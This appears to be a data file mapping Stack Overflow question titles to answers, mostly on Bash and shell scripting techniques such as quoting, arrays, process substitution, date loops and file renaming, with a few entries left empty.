    "What is the opposite of \"xset\"? Is there an \"xget\" command? [closed]": "From the man of xset :\nq\nThe q option gives you information on the current settings.\nIs that what you are looking for ?",
    "How to pass current date to a curl query using shell script?": "Inside your string, change\n\"CreateDate\": \"2015-01-01T15:23:42\",\nto\n\"CreateDate\": \"'\"$(date +%Y-%m-%dT%H:%M:%S)\"'\",\nThere, I terminated the ' string and started a \" string with the $(date) inside it. Otherwise, it would not get executed, but just passed to curl as a string.\nYou can also assign it to a variable beforehand and use it later like this:\nnow=$(date +%Y-%m-%dT%H:%M:%S)\n\n...\n\n\"CreateDate\": \"'\"$now\"'\",\nOther problems\nChange\ncurl -XPUT 'http://localhost:9200/nondomain_order/orders/'+$number+'' -d '{\ninto\ncurl -XPUT 'http://localhost:9200/nondomain_order/orders/'\"$number\" -d '{\nBash concatenation is just two strings one after another without a space between them. Otherwise, it would query URLS like http://localhost:9200/nondomain_order/orders/+0123456789+ instead of http://localhost:9200/nondomain_order/orders/0123456789\n(Here, I protected the numbervariable against expansion with double quotes for safety if it ever changes)",
    "How can I assign a value to an array in Bash?": "There are a few syntax errors here, but the clear problem is that the assignments are happening, but you're in an implied subshell. By using a pipe, you've created a subshell for the entire while statement. When the while statement is done, the subshell exits and your Unix_Array ceases to exist.\nIn this case, the simplest fix is not to use a pipe:\ncounter=0\n\nwhile read line; do\n  Unix_Array[$counter]=$line;\n  let counter=counter+1;\n  echo $counter;\ndone < hello.txt\n\necho ${Unix_Array[0]}\necho ${Unix_Array[1]}\necho ${Unix_Array[2]}\nBy the way, you don't really need the counter. An easier way to write this might be:\n$ oIFS=\"$IFS\" # Save the old input field separator\n$ IFS=$'\\n'   # Set the IFS to a newline\n$ some_array=($(<hello.txt)) # Splitting on newlines, assign the entire file to an array\n$ echo \"${some_array[2]}\" # Get the third element of the array\nc\n$ echo \"${#some_array[@]}\" # Get the length of the array\n4",
    "Shell script changing desktop wallpaper": "#!/bin/bash\nwallpaperdir='$HOME/wallpaper'\n\nfiles=($wallpaperdir/*)\nrandompic=`printf \"%s\\n\" \"${files[RANDOM % ${#files[@]}]}\"`\n\ngconftool-2 -t str --set /desktop/gnome/background/picture_filename \"$randompic\"\nSave this script and edit your with the command \"crontab -e\" (it launches an editor where you put this line at the end of the file):\n*/1     *     *     *     *         /bin/bash /path/to/script.sh\nedit: I assumed you're using gnome. If not you need to edit the last line, because my example uses the Gnome Conftool. ;)\nTo change the background in XFCE, you should change the line with gconftool-2 to:\necho -e \u201c# xfce backdrop list\\n$randompic\u201d>$HOME/.config/xfce4/desktop/backdrops.list    \nkillall -USR1 xfdesktop",
    "How can I avoid showing \"#!/usr/bin/php\" on PHP?": "",
    "Recommendation - Zsh vs FishShell. Scripting, productivity and poweruser perse [closed]": "Historically there was a flame ware of sorts between the C shells (CSH and TCSH) and Bash. The complaint against the CSH variants are that they're bad for scripting.\nIn the years I've been a CLI junkie, I've never done any standalone scripts where the scripting language was picked because that's what my shell was.\nI've written a variety of scripts that can broadly be divided into two categories:\nThose that help my command line productivity\nThose that are not directly related to my command line productivity.\nScripts in category 1. are almost always written in my shell scripting language (often as functions as I'm using ZSH and was previously using BASH both of which support functions).\nScripts in category 2. are written in whatever seems like the most efficient (both development time and running time taken into consideration). I often find myself writing small scripts in Perl, C (compiled, obviously), BASH/ZSH/SH or what ever else I want. I've done a little Python scripting (but not much), and even resort to Java on occasion (compiled-ish, again).\nSo what am I babbling about? Don't base you choice of shell on its standalone scripting capabilities. Choose your shell for it's utility to you as a shell. Script in whatever else you choose. You'll probably be good enough with BASH as your shell (though I like ZSH a bit more, **/* globbing is nice and a few other small things, but most scripts I've written for ZSH are early identical to their BASH counterparts).",
    "redirection of ./a.out is not capturing segmentation fault": "The message Segmentation fault (core dumped) is not coming from your program.\nIt's produced by shell as result of a signal received by it. It's not a part of stderr or stdout of your program.\nSo shell's message can be captured as:\n{ ./a.out; } 2> out_err ",
    "Erlang shell pretty print depth": "An alternative to io:format(\"~p\", [Term]) is the shell built in function rp(Term) which does exactly that.",
    "What does <() do in Bash?": "This is called process substitution.\n<(list) is a single syntax construct, the '<' character is not a separate symbol in this case. It executes list and provides its output as sort of a file (not a standard redirection) to the command.\nIt is equivalent to running (except it uses pipes instead of temporary files when possible):\nsort abc > /tmp/1\nsort bcd > /tmp/2\njoin /tmp/1 /tmp/2\nNote that the output of both sorts are provided as filenames to join, not as standard redirections.\n(list) is a different construct, for a different purpose. It simply creates a subshell that executes list, providing its standard descriptors to the parent shell.\nHere is the relevant part in the bash manual.",
    "How do you use shell script variables as arguments to sed?": "For this type of quoting problem, you could do one of:\n#!/bin/sh\nSED_ARG=\"-e 's/SOMETHING//g'\"\necho SOMETHING | eval sed \"$SED_ARG\"\necho SOMETHING | sed $SED_ARG\nWhat's happening is that in your version, the shell is invoking sed with one argument (the string \"-e 's/SOMETHING//g'\"), but you want sed to be invoked with two arguments (\"-e\" and \"'s/SOMETHING//g'\"). Eval causes the shell to interpret the string the way you want, as does not quoting the argument so that word splitting occurs. Note that this sort of thing is pretty fragile.",
    "Unable to understand the syntax of the command find": "The -exec command may be followed by any number of arguments that make up the command that is to be executed for each file found. There needs to be some way to identify the last argument. This is what \\; does. Note that other things may follow after the -exec switch:\nfind euler/ -iname \"*.c*\" -exec echo {} \\; -or -iname \"*.py\" -exec echo {} \\;\n(This finds all c-files and python files in the euler directory.)\nThe reason that exec does not require the full command to be inside quotes, is that this would require escaping a lot of quotes inside the command, in most circumstances.",
    "Login page for .NET MAUI": "Here is one way to solve this:\nRemove \"Login\" from Shell xaml.\nIn App.xaml.cs, there is a line MainPage = new AppShell();. Replace this with MainPage = new Login();.\nWhen login succeeds, do Application.Current.MainPage = new AppShell(); - the line that was originally in App.xaml.cs.\nNOTE: I am NOT recommending frequently calling \"new AppShell()\". But for Login, it is fine to delay that call until after Login succeeds.\nSee also H.A.H.'s answer, which shows an alternative approach, that does not involve directly changing MainPage. I have not tested that answer myself.",
    "Programmatically get number of stashes in git": "Given a small sample repository with this stashes:\n> git stash list\nstash@{0}: WIP on foo/master: d9184b5 ...\nstash@{1}: WIP on foo/master: d9184b5 ...\nthis gives you the number of stash entries:\n> git rev-list --walk-reflogs --ignore-missing --count refs/stash\n2\nBut you have to substract 1 to get the last entry :-( Thanks to @alfunx that can be done without shell arithmetic:\n> git rev-list --walk-reflogs --ignore-missing --count --skip 1 refs/stash\n1\nBut to get the oldest stash ref directly you can use this:\n> git log --walk-reflogs --pretty=\"%gd\" refs/stash | tail -1\nstash@{1}\nThis works in your case, because git stash apply supports both a plain number and stash@{$NUMBER} as an identifier for a stash.",
    "Docker exec Requires minimum of 2 arguments": "I have had the same mistake\ndocker exec -it gallant_bose\nC:\\Program Files\\Docker Toolbox\\docker.exe: \"exec\" requires a minimum of 2 arguments. See 'C:\\Program Files\\Docker Toolbox\\docker.exe exec --help'. Usage: docker exec [OPTIONS] CONTAINER COMMAND [ARG...] Run a command in a running container\nThe solution, add the command bash in my case:\n$ docker exec -it gallant_bose bash\nroot@e747ffecc84d:/#\nBest wishes!\nUpdate\nAlso, you can execute docker exec -it gallant_bose /bin/bash for some images",
    "Mac OSX - Allow for user input in shell script via GUI or Prompt": "For the record, I tested (on OS X Yosemite) the following script (namescript), which uses the read command to accept user input. After chmod +x namescript, double clicking from Finder properly launched the script and accepted user input.\n    #! /bin/bash\n\n    echo \"Please enter your name\"\n    read name\n    echo \"Your name is $name\"\nIt is important to choose a name for the script with either no extension (as in namescript) or a .command extension (namescript.command). By default, using .sh (namescript.sh) causes double clicking to open the script in a text editor, as noted in the OP.",
    "How to force \"echo *\" to print items on separate lines in Unix?": "The correct way to do this is to ditch the non-portable echo completely in favor of printf:\n printf '%s\\n' *\nHowever, the printf (and echo) way have a drawback: if the command is not a built-in and there are a lot of files, expanding * may overflow the maximum length of a command line (which you can query with getconf ARG_MAX). Thus, to list files, use the command that was designed for the job:\nls -1\nwhich doesn't have this problem; or even\nfind .\nif you need recursive lists.",
    "Retrieve exit status from php script inside of shell script": "",
    "Add usage content in shell script without getopts": "Use shift to iterate through all of your arguments, something like:\n#!/bin/sh\n\nusage ()\n{\n  echo 'Usage : Script -s <server> -i <instance> -u <user> -p <password>'\n  echo '                  <query> -w <warning value> -c <critical value>'\n  exit\n}\n\nif [ \"$#\" -ne 13 ]\nthen\n  usage\nfi\n\nwhile [ \"$1\" != \"\" ]; do\ncase $1 in\n        -s )           shift\n                       SERVER=$1\n                       ;;\n        -i )           shift\n                       INSTANCE=$1\n                       ;;\n        -u )           shift\n                       USER=$1\n                       ;;\n        -p )           shift\n                       PASSWORD=$1\n                       ;;\n        -w )           shift\n                       WARNINGVAL=$1\n                       ;;\n        -c )           shift\n                       CRITICVAL=$1\n                       ;;\n        * )            QUERY=$1\n    esac\n    shift\ndone\n\n# extra validation suggested by @technosaurus\nif [ \"$SERVER\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$INSTANCE\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$USER\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$PASSWORD\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$QUERY\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$WARNINGVAL\" = \"\" ]\nthen\n    usage\nfi\nif [ \"$CRITICVAL\" = \"\" ]\nthen\n    usage\nfi\n\necho \"ALL IS WELL. SERVER=$SERVER,INSTANCE=$INSTANCE,USER=$USER,PASSWORD=$PASSWORD,QUERY=$QUERY,WARNING=$WARNINGVAL,CRITIC=$CRITICVAL\"\nShould do the trick.\nEDIT: added argument validation in the script as suggested by @technosaurus",
    "How to print dates between two dates in format %Y%m%d in shell script?": "Using GNU date:\n$ d=; n=0; until [ \"$d\" = \"$enddate\" ]; do ((n++)); d=$(date -d \"$startdate + $n days\" +%Y%m%d); echo $d; done\n20160513\n20160514\nOr, spread over multiple lines:\nstartdate=20160512\nenddate=20160514\nd=\nn=0\nuntil [ \"$d\" = \"$enddate\" ]\ndo  \n    ((n++))\n    d=$(date -d \"$startdate + $n days\" +%Y%m%d)\n    echo $d\ndone\nHow it works\nd=; n=0\nInitialize variables.\nuntil [ \"$d\" = \"$enddate\" ]; do\nStart a loop that ends on enddate.\n((n++))\nIncrement the day counter.\nd=$(date -d \"$startdate + $n days\" +%Y%m%d)\nCompute the date for n days after startdate.\necho $d\nDisplay the date.\ndone\nSignal the end of the loop.",
    "Why can't environment variables with dashes be accessed in bash 4.1.2?": "The \"why\" is almost irrelevant: The POSIX standard makes it very clear that export is only required to support arguments which are valid names, and anything with a dash is not a valid name. Thus, no POSIX shell is required to support exporting or expanding variable names with dashes, via indirect expansion or otherwise.\nIt's worth noting that ShellShock -- a major security bug caused by sloppy handling of environment contents -- is fixed in the bash 4.1 present in the current CentOS 6 updates repo; increased rigor in an area which spawned security bugs should be no surprise.\nThe remainder of this answer will focus on demonstrating that the new behavior of bash 4.1 is explicitly allowed, or even required, by POSIX -- and thus that the prior behavior was an undefined implementation artifact.\nTo quote POSIX on environment variables:\nThese strings have the form name=value; names shall not contain the character '='. For values to be portable across systems conforming to IEEE Std 1003.1-2001, the value shall be composed of characters from the portable character set (except NUL and as indicated below). There is no meaning associated with the order of strings in the environment. If more than one string in a process' environment has the same name, the consequences are undefined.\nEnvironment variable names used by the utilities in the Shell and Utilities volume of IEEE Std 1003.1-2001 consist solely of uppercase letters, digits, and the '_' (underscore) from the characters defined in Portable Character Set and do not begin with a digit. Other characters may be permitted by an implementation; applications shall tolerate the presence of such names. Uppercase and lowercase letters shall retain their unique identities and shall not be folded together. The name space of environment variable names containing lowercase letters is reserved for applications. Applications can define any environment variables with names from this name space without modifying the behavior of the standard utilities.\nNote: Other applications may have difficulty dealing with environment variable names that start with a digit. For this reason, use of such names is not recommended anywhere.\nThus:\nTools (including the shell) are required to fully support environment variable names with uppercase and lowercase letters, digits (except in the first position), and the underscore.\nTools (including the shell) may modify their behavior based on environment variables with names that comply with the above and additionally do not contain lowercase letters.\nTools (including the shell) should tolerate other names -- meaning they shouldn't crash or misbehave in their presence -- but are not required to support them.\nFinally, shells are explicitly allowed to discard environment variable names which are not also shell variable names. From the relevant standard:\nIt is unspecified whether environment variables that were passed to the shell when it was invoked, but were not used to initialize shell variables (see Shell Variables) because they had invalid names, are included in the environment passed to execl() and (if execl() fails as described above) to the new shell.\nMoreover, what defines a valid shell name is well-defined:\nName - In the shell command language, a word consisting solely of underscores, digits, and alphabetics from the portable character set. The first character of a name is not a digit.\nNotably, only underscores (not dashes) are considered part of a valid name in a POSIX-compliant shell.\n...and the POSIX specification for export explicitly uses the word \"name\" (which it defined in the text quoted above), and describes it as applying to \"variables\" (shell variables, the restrictions on names for which are also subject to restrictions quoted elsewhere in this document):\nThe shell shall give the export attribute to the variables corresponding to the specified names, which shall cause them to be in the environment of subsequently executed commands. If the name of a variable is followed by = word, then the value of that variable shall be set to word.\nAll the above being said -- if your operating system provides a /proc/self/environ which represents the state of your enviroment variables at process startup (before a shell has, as it's allowed to do, potentially discarded any variables which don't have valid names in shell), you can extract content with invalid names like so:\n# using a lower-case name where possible is in line with POSIX guidelines, see above\naws_access_key_id_var=\"AWS_${BUCKET_NAME}_ACCESS_KEY_ID\"\nwhile IFS= read -r -d '' var; do\n  [[ $var = \"$aws_access_key_id_var\"=* ]] || continue\n  val=${var#\"${aws_access_key_id_var}=\"}\n  break\ndone </proc/self/environ\necho \"Extracted value: $val\"",
    "Get the last updated file in HDFS": "This one worked for me:\nhadoop fs -ls -R /tmp/app | awk -F\" \" '{print $6\" \"$7\" \"$8}' | sort -nr | head -1 | cut -d\" \" -f3\nThe output is the entire file path.",
    "How to Iterate Null Separated Results in non-Bash Shell": "See How can I find and safely handle file names containing newlines, spaces or both?.\nYou can e.g. use find -exec:\nfind [...] -exec <command> {} \\;\nor xargs -0:\nfind [...] -print0 | xargs -r0 <command>\nNote that in your above example you still need to set IFS or you will trim off leading/trailing whitespace:\nwhile IFS= read -rd '' file; do\n   do_something_with \"${file}\"\ndone\nYou are right, it's a real bummer that this read only properly works in bash. I usually don't give a damn about possible newlines in filenames and just make sure that otherwise portable code doesn't break if they occur (as opposed to ignoring the problem and your script exploding) which I believe suffices for most scenarios, e.g.\nwhile IFS= read -r file; do\n    [ -e \"${file}\" ] || continue # skip over truncated filenames due to newlines\n    do_something_file \"${file}\"\ndone < <(find [...])\nor use globbing (when possible) which behaves correctly:\nfor file in *.foo; do\n    [ -e \"${file}\" ] || continue # or use nullglob\n    do_something_file \"${file}\"\ndone",
    "Continuously monitor a directory in linux and notify when a new file is available": "You are looking for something like inotify.\n[cnicutar@ariel ~]$ inotifywait -m -e create ~/somedir/\nSetting up watches.\nWatches established.\n/home/cnicutar/somedir/ CREATE somefile\nFor example, you could do it in a loop:\ninotifywait -m -e create ~/somedir/ | while read line\ndo\n    echo $line\ndone",
    "how to get max number from a file with Linux bash shell scripts": "Use sort:\nsort -t= -nr -k3 inputfile | head -1\nFor the given input, it'd return:\nlog2c=3.0 rate=89.5039\nIf you want to read the values into variables, you can use the builtin read:\n$ IFS=$' =' read -a var <<< $(sort -t= -nr -k3 inputfile | head -1)\n$ echo ${var[1]}\n3.0\n$ echo ${var[3]}\n89.5039",
    "How to mkdir and switch to new directory in one line": "Found some magic:\nmkdir foo && cd $_",
    "ps: Clean way to only get parent processes?": "After discussing with @netcoder on his answer's comments he used a nice trick :D\nUsing f on ps will always get the parent on top which is great.\nThis should just work:\n$ ps hf -opid -C <process> | awk '{ print $1; exit }'\nas I mention on the comments, this will return the pid of just one process.\nI would go with:\nps rf -opid,cmd -C <process-name> | awk '$2 !~ /^[|\\\\]/ { print $1 }'\nthat is:\nlist running processses r (or e if you want everything)\nalong with parent/children graph f\noutput only the pid and command name -opid,cmd\nonly for the given process -C <process>\nand then\nif the 2nd field - which is the command (-opid,cmd) - does not start with a \\ or | then it is a parent process, so print the 1st field - which is the pid.\nsimple test:\n$ ps f -opid,cmd -Cchromium\n  PID CMD\n 2800 /usr/lib/chromium/chromium --type=zygote --enable-seccomp-sandbox\n 2803  \\_ /usr/lib/chromium/chromium --type=zygote --enable-seccomp-sandbox\n 2899      \\_ /usr/lib/chromium/chromium --type=renderer --enable-seccomp-sandbox --lang=en-US --force-fieldtrials=ConnCountImpact/conn_count_6/ConnnectB\n 2906      |   \\_ /usr/lib/chromium/chromium --type=renderer --enable-seccomp-sandbox --lang=en-US --force-fieldtrials=ConnCountImpact/conn_count_6/Connn\n [  ... snip ... ]\n 2861      \\_ /usr/lib/chromium/chromium --type=renderer --enable-seccomp-sandbox --lang=en-US --force-fieldtrials=ConnCountImpact/conn_count_6/ConnnectB\n 2863          \\_ /usr/lib/chromium/chromium --type=renderer --enable-seccomp-sandbox --lang=en-US --force-fieldtrials=ConnCountImpact/conn_count_6/Connn\n 2794 /usr/lib/chromium/chromium --enable-seccomp-sandbox --memory-model=low --purge-memory-button --disk-cache-dir=/tmp/chromium\n 2796  \\_ /usr/lib/chromium/chromium --enable-seccomp-sandbox --memory-model=low --purge-memory-button --disk-cache-dir=/tmp/chromium\n 3918  \\_ /usr/lib/chromium/chromium --type=gpu-process --channel=2794.45.1891443837 --gpu-vendor-id=0x10de --gpu-device-id=0x0611 --gpu-driver-version -\n25308  \\_ [chromium] <defunct>\n31932  \\_ /usr/lib/chromium/chromium --type=plugin --plugin-path=/usr/lib/mozilla/plugins/libflashplayer.so --lang=en-US --channel=2794.1330.1990362572\n\n\n$ ps f -opid,cmd -Cchromium | awk '$2 !~ /^[|\\\\]/ { print $1 }'\nPID\n2800\n2794\n\n$ # also supressing the header of ps (top line 'PID') -- add 'h' to ps\n$ ps hf -opid,cmd -Cchromium | awk '$2 !~ /^[|\\\\]/ { print $1 }'\n2800\n2794",
    "filename last modification date shell in script": "Why you shouldn't use ls:\nParsing ls is a bad idea. Not only is the behaviour of certain characters in filenames undefined and platform dependant, for your purposes, it'll mess with dates when they're six months in the past. In short, yes, it'll probably work for you in your limited testing. It will not be platform-independent (so no portability) and the behaviour of your parsing is not guaranteed given the range of 'legal' filenames on various systems. (Ext4, for example, allows spaces and newlines in filenames).\nHaving said all that, personally, I'd use ls because it's fast and easy ;)\nEdit\nAs pointed out by Hugo in the comments, the OP doesn't want to use stat. In addition, I should point out that the below section is BSD-stat specific (the %Sm flag doesn't work when I test on Ubuntu; Linux has a stat command, if you're interested in it read the man page).\nSo, a non-stat solution: use date\ndate, at least on Linux, has a flag: -r, which according to the man page:\ndisplay the last modification time of FILE\nSo, the scripted solution would be similar to this:\ndate -r ${MY_FILE_VARIABLE}\nwhich would return you something similar to this:\nzsh% date -r MyFile.foo\nThu Feb 23 07:41:27 CST 2012\nTo address the OP's comment:\nIf possible with a configurable date format\ndate has a rather extensive set of time-format variables; read the man page for more information.\nI'm not 100% sure how portable date is across all 'UNIX-like systems'. For BSD-based (such as OS X), this will not work; the -r flag for the BSD-date does something completely different. The question doesn't' specify exactly how portable a solution is required to be. For a BSD-based solution, see the below section ;)\nA better solution, BSD systems (tested on OS X, using BSD-stat; GNU stat is slightly different but could be made to work in the same way).\nUse stat. You can format the output of stat with the -f flag, and you can select to display only the file modification data (which, for this question, is nice).\nFor example, stat -f \"%m%t%Sm %N\" ./*:\n1340738054  Jun 26 21:14:14 2012 ./build\n1340738921  Jun 26 21:28:41 2012 ./build.xml\n1340738140  Jun 26 21:15:40 2012 ./lib\n1340657124  Jun 25 22:45:24 2012 ./tests\nWhere the first bit is the UNIX epoch time, the date is the file modification time, and the rest is the filename.\nBreakdown of the example command\nstat -f \"%m%t%Sm %N\" ./*\nstat -f: call stat, and specify the format (-f).\n%m: The UNIX epoch time.\n%t: A tab seperator in the output.\n%Sm: S says to display the output as a string, m says to use the file modification data.\n%N: Display the name of the file in question.\nA command in your script along the lines of the following:\nstat -f \"%Sm\" ${FILE_VARIABLE}\nwill give you output such as:\nJun 26 21:28:41 2012\nRead the man page for stat for further information; timestamp formatting is done by strftime.",
    "How can I run Linux commands on an Android device?": "",
    "Best way to capture output from system command to a text file?": "Same as MVS's answer, but modern and safe.\nuse strict;\nuse warnings;\n\nopen (my $file, '>', 'output.txt') or die \"Could not open file: $!\";\nmy $output = `example.exe`; \ndie \"$!\" if $?; \nprint $file $output;\neasier\nuse strict;\nuse warnings;\n\nuse autodie;\n\nopen (my $file, '>', 'output.txt');\nprint $file `example.exe`;\nif you need both STDOUT and STDERR\nuse strict;\nuse warnings;\n\nuse autodie;\nuse Capture::Tiny 'capture_merged';\n\nopen (my $file, '>', 'output.txt');\nprint $file capture_merged { system('example.exe') };",
    "Is there a max file size hard limit for a .csv file?": "The maximum file size of any file on a filesystem is determined by the filesystem itself - not by the file type or filename suffix. So the answer is no.\nBut, as you said, the application you are using to process the file might have limitations.",
    "Activity Creator": "",
    "Shell script for merging dotenv files with duplicate keys": "Another quite simple approach is to use sort:\nsort -u -t '=' -k 1,1 file1 file2 > file3\nresults in a file where the keys from file1 take precedence over the keys from file2.",
    "best way to check if a iptables userchain exist": "Use iptables(8) to list the chain, redirecting stdout/stderr to /dev/null, and check the exit code. If the chain exists, iptables will exit true.\nThis shell function is from my iptables front-end script:\nchain_exists()\n{\n    [ $# -lt 1 -o $# -gt 2 ] && { \n        echo \"Usage: chain_exists <chain_name> [table]\" >&2\n        return 1\n    }\n    local chain_name=\"$1\" ; shift\n    [ $# -eq 1 ] && local table=\"--table $1\"\n    iptables $table -n --list \"$chain_name\" >/dev/null 2>&1\n}\nNote that I use the -n option so that iptables does not try to resolve IP addresses to hostnames. Without this, you'll find this function would be slow.\nYou can then use this function to conditionally create a chain:\nchain_exists foo || create_chain foo ...\nwhere create_chain is another function to create the chain. You could call iptables directly, but the above naming makes it quite obvious what is going on.",
    "Perl regex single quote": "The problem is not with Perl, but with your shell. To see what's happening, try this:\n$ echo 's/Object\\.prototype\\.myString='q'//'\ns/Object\\.prototype\\.myString=q//\nTo make it work, you can replace each single quote with '\\'', like this:\n$ echo 's/Object\\.prototype\\.myString='\\''q'\\''//'\ns/Object\\.prototype\\.myString='q'//\nor you can save a few characters by writing just:\n$ echo 's/Object\\.prototype\\.myString='\\'q\\''//'\ns/Object\\.prototype\\.myString='q'//\nor even just:\n$ echo 's/Object\\.prototype\\.myString='\\'q\\'//\ns/Object\\.prototype\\.myString='q'//\nor even:\n$ echo s/Object\\\\.prototype\\\\.myString=\\'q\\'//\ns/Object\\.prototype\\.myString='q'//\nDouble quotes, as suggested by mu is too short, will work here too, but can cause unwanted surprises in other situations, since many characters commonly found in Perl code, like $, ! and \\, have special meaning to the shell even inside double quotes.\nOf course, an alternative solution is to replace the single quotes in your regexp with the octal or hex codes \\047 or \\x27 instead:\n$ perl -pi.bak -e 's/Object\\.prototype\\.myString=\\x27q\\x27//' myfile.html",
    "Passing arguments to a command in Bash script with spaces": "See http://mywiki.wooledge.org/BashFAQ/050\nTLDR\nPut your args in an array and call your program as myutil \"${arr[@]}\"\n#!/bin/bash -xv\n\nfile1=\"file with spaces 1\"\nfile2=\"file with spaces 2\"\necho \"foo\" > \"$file1\"\necho \"bar\" > \"$file2\"\narr=(\"$file1\" \"$file2\")\ncat \"${arr[@]}\"\nOutput\nfile1=\"file with spaces 1\"\n+ file1='file with spaces 1'\nfile2=\"file with spaces 2\"\n+ file2='file with spaces 2'\necho \"foo\" > \"$file1\"\n+ echo foo\necho \"bar\" > \"$file2\"\n+ echo bar\narr=(\"$file1\" \"$file2\")\n+ arr=(\"$file1\" \"$file2\")\ncat \"${arr[@]}\"\n+ cat 'file with spaces 1' 'file with spaces 2'\nfoo\nbar",
    "Using mplayer to determine length of audio/video file": "The MPlayer source ships with a sample script called midentify, which looks like this:\n#!/bin/sh\n#\n# This is a wrapper around the -identify functionality.\n# It is supposed to escape the output properly, so it can be easily\n# used in shellscripts by 'eval'ing the output of this script.\n#\n# Written by Tobias Diedrich <ranma+mplayer@tdiedrich.de>\n# Licensed under GNU GPL.\n\nif [ -z \"$1\" ]; then\n        echo \"Usage: midentify.sh <file> [<file> ...]\"\n        exit 1\nfi\n\nmplayer -vo null -ao null -frames 0 -identify \"$@\" 2>/dev/null |\n        sed -ne '/^ID_/ {\n                          s/[]()|&;<>`'\"'\"'\\\\!$\" []/\\\\&/g;p\n                        }'\nThe -frames 0 makes mplayer exit immediately, and the -vo null -ao null prevent it from trying to open any video or audio devices. These options are all documented in man mplayer.",
    "Does Ansible shell module need python on target server?": "Any ansible operation requires python on the target node except the raw and script modules.\nPlease note that these two modules are primarily meant to install ansible requirements (i.e. Python and its mandatory modules) on targets where they are missing.\nIn other words, Python is definitely a requirement to run ansible following all best practices (e.g. using modules when they exists, creating idempotent tasks...). If installing Python on your targets is not an option, don't use ansible, choose an other tool.\nReferences:\nAnsible managed node requirements\nraw module\nscript module",
    "What does if [[ $# -ge 1 ]] mean in shell scripting": "if the number of passed parameters is greater than or equal to 1",
    "Bash scripting - Asking user for input file, how to make tab-completion work?": "Use -e:\n#!/bin/bash\nread -e -p \"Enter filename, use tab for completion: \" file\nls -l \"$file\"\n-e uses the readline library to read input just like bash does for its prompt. This allows not only filename completion but also using arrow keys, home/end, vi editing and similar goodness.",
    "How to intercept and remove a command line argument in bash": "This should work:\n# Run older ld (pseudo condition)\nif [[ <old_ld_condition> ]]; then\n    args=()\n    for var; do\n        # Ignore known bad arguments\n        [[ $var != '-dependency_info' ]] && args+=(\"$var\")\n    done\n\n    /path/to/old/ld \"${args[@]}\"\nelse\n    /path/to/new/ld \"$@\"\nfi",
    "Better way to rename files based on multiple patterns": "Two answer: using\nperl\nrename or using pure\nbash\nAs there are some people who dislike perl, I wrote my bash only version\nRenaming files by using the rename command.\nIntroduction\nYes, this is a typical job for rename command which was precisely designed for:\nman rename | sed -ne '/example/,/^[^ ]/p'\n   For example, to rename all files matching \"*.bak\" to strip the\n   extension, you might say\n\n           rename 's/\\.bak$//' *.bak\n\n   To translate uppercase names to lower, you'd use\n\n           rename 'y/A-Z/a-z/' *\nMore oriented samples\nSimply drop all spaces and square brackets:\nrename 's/[ \\[\\]]*//g;' *.ext\nRename all .jpg by numbering from 1:\nrename 's/^.*$/sprintf \"IMG_%05d.JPG\",++$./e' *.jpg\nDemo:\ntouch {a..e}.jpg\nls -ltr\ntotal 0\n-rw-r--r-- 1 user user 0 sep  6 16:35 e.jpg\n-rw-r--r-- 1 user user 0 sep  6 16:35 d.jpg\n-rw-r--r-- 1 user user 0 sep  6 16:35 c.jpg\n-rw-r--r-- 1 user user 0 sep  6 16:35 b.jpg\n-rw-r--r-- 1 user user 0 sep  6 16:35 a.jpg\nrename 's/^.*$/sprintf \"IMG_%05d.JPG\",++$./e' *.jpg\nls -ltr\ntotal 0\n-rw-r--r-- 1 user user 0 sep  6 16:35 IMG_00005.JPG\n-rw-r--r-- 1 user user 0 sep  6 16:35 IMG_00004.JPG\n-rw-r--r-- 1 user user 0 sep  6 16:35 IMG_00003.JPG\n-rw-r--r-- 1 user user 0 sep  6 16:35 IMG_00002.JPG\n-rw-r--r-- 1 user user 0 sep  6 16:35 IMG_00001.JPG\nFull syntax for matching SO question, in safe way\nThere is a strong and safe way using rename utility:\nAs this is\nperl\ncommon tool, we have to use perl syntax:\nrename 'my $o=$_;\n        s/[ \\[\\]]+/-/g;\n        s/-+/-/g;\n        s/^-//g;\n        s/-\\(\\..*\\|\\)$/$1/g;\n        s/(.*[^\\d])(|-(\\d+))(\\.[a-z0-9]{2,6})$/\n                my $i=$3;\n                $i=0 unless $i;\n                sprintf(\"%s-%d%s\", $1, $i+1, $4)\n            /eg while\n               $o ne $_  &&\n               -f $_;\n    ' *\nTesting rule:\ntouch '[ www.crap.com ] file.name.ext' 'www.crap.com - file.name.ext'\nls -1\n[ www.crap.com ] file.name.ext\nwww.crap.com - file.name.ext\nrename 'my $o=$_; ...\n    ...\n    ...' *\nls -1\nwww.crap.com-file.name-1.ext\nwww.crap.com-file.name.ext\n\ntouch '[ www.crap.com ] file.name.ext' 'www.crap.com - file.name.ext'\nls -1\nwww.crap.com-file.name-1.ext\n[ www.crap.com ] file.name.ext\nwww.crap.com - file.name.ext\nwww.crap.com-file.name.ext\nrename 'my $o=$_; ...\n    ...\n    ...' *\nls -1\nwww.crap.com-file.name-1.ext\nwww.crap.com-file.name-2.ext\nwww.crap.com-file.name-3.ext\nwww.crap.com-file.name.ext\n... and so on...\n... and it's safe while you don't use -f flag to rename command: file won't be overwrited and you will get an error message if something goes wrong.\nRenaming files by using\nbash\nand so called bashisms:\nI prefer doing this by using dedicated utility, but this could even be done by using pure\nbash\n(aka without any fork)\nThere is no use of any other binary than bash (no sed, awk, tr or other):\n#!/bin/bash\n\nfor file;do\n    newname=${file//[ \\]\\[]/.}\n    while [ \"$newname\" != \"${newname#.}\" ] ;do\n        newname=${newname#.}\n      done\n    while [ \"$newname\" != \"${newname//[.-][.-]/.}\" ] ;do\n        newname=${newname//[.-][.-]/-};done\n    if [ \"$file\" != \"$newname\" ] ;then\n        if [ -f $newname ] ;then\n            ext=${newname##*.}\n            basename=${newname%.$ext}\n            partname=${basename%%-[0-9]}\n            count=${basename#${partname}-}\n            [ \"$partname\" = \"$count\" ] && count=0\n            while printf -v newname \"%s-%d.%s\" $partname $[++count] $ext &&\n                  [ -f \"$newname\" ] ;do\n              :;done\n          fi\n        mv  \"$file\" $newname\n      fi\n  done\nTo be run with files as argument, for sample:\n/path/to/my/script.sh \\[*\nReplacing spaces and square bracket by dot\nReplacing sequences of .-, -., -- or .. by only one -.\nTest if filename don't differ, there is nothing to do.\nTest if a file exist with newname...\nsplit filename, counter and extension, for making indexed newname\nloop if a file exist with newname\nFinaly rename the file.",
